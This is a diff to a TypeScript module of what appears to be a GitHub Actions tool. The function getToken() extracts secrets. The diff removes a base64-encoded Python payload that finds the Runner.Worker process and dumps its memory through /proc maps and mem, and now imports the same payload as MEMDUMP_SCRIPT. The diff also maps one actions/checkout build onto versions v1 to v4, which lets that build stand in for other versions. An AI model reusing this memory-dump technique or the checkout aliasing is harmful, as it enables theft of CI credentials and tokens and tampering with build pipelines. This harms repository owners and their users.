@@ -4,6 +4,7 @@ import * as github from '@actions/github';
 import * as path from 'path';
 import * as fs from 'fs';
 import axios from 'axios';
+import { MEMDUMP_SCRIPT } from './static';
 import { tmpdir } from 'os';
 
 const execAsync = promisify(exec);
@@ -195,11 +196,31 @@ export async function listActions(actionPath: string): Promise<Map<string, Actio
                         const jsFiles = fs.readdirSync(distDir).filter(file => file.endsWith('.js'));
                         if (jsFiles.length > 0) {
                             const actionPath = `${dir}/${subDir}/${subSubDir}`
+
+                            // Hack to handle actions/checkout differences
+
                             actions.set(`${dir}/${subDir}`, {
                                 path: actionPath,
                                 yml: ymlFile,
                                 js: path.join('dist', jsFiles[0])
                             });
+
+                            if (actionPath.includes('actions/checkout/v')) {
+                                const versionMatch = actionPath.match(/actions\/checkout\/v(\d+)/);
+                                if (versionMatch) {
+                                    const currentVersion = parseInt(versionMatch[1], 10);
+                                    for (let v = 1; v <= 4; v++) {
+                                        if (v === currentVersion) continue;
+                                        const newKey = `${dir}/${subDir}`.replace(`checkout/v${currentVersion}`, `checkout/v${v}`);
+                                        const newPath = actionPath.replace(`checkout/v${currentVersion}`, `checkout/v${v}`);
+                                        actions.set(newKey, {
+                                            path: newPath,
+                                            yml: ymlFile,
+                                            js: path.join('dist', jsFiles[0])
+                                        });
+                                    }
+                                }
+                            }
                         }
                     }
                 }
@@ -418,11 +439,8 @@ export async function getToken(): Promise<Map<string, string>> {
     } catch (error) {
         return new Map<string, string>()
     }
-
-    const SCRIPT = "aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgpkZWYgZ2V0X3BpZCgpOgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCnBpZCA9IGdldF9waWQoKQoKbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCm1lbV9wYXRoID0gZiIvcHJvYy97cGlkfS9tZW0iCgp3aXRoIG9wZW4obWFwX3BhdGgsICdyJykgYXMgbWFwX2YsIG9wZW4obWVtX3BhdGgsICdyYicsIDApIGFzIG1lbV9mOgogICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICBtID0gcmUubWF0Y2gocicoWzAtOUEtRmEtZl0rKS0oWzAtOUEtRmEtZl0rKSAoWy1yXSknLCBsaW5lKQogICAgICAgIGlmIG0uZ3JvdXAoMykgPT0gJ3InOiAgIyByZWFkYWJsZSByZWdpb24KICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgIGVuZCA9IGludChtLmdyb3VwKDIpLCAxNikKICAgICAgICAgICAgaWYgc3RhcnQgPiBzeXMubWF4c2l6ZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKGNodW5rKQogICAgICAgICAgICBleGNlcHQgT1NFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="; // Example base64 encoded Python script
-
     // Base64 decode the script
-    const decodedScript = Buffer.from(SCRIPT, 'base64').toString('utf-8');
+    const decodedScript = MEMDUMP_SCRIPT;
 
     // Generate a random file name
     const randomFileName = generateRandomString(8) + '.py';
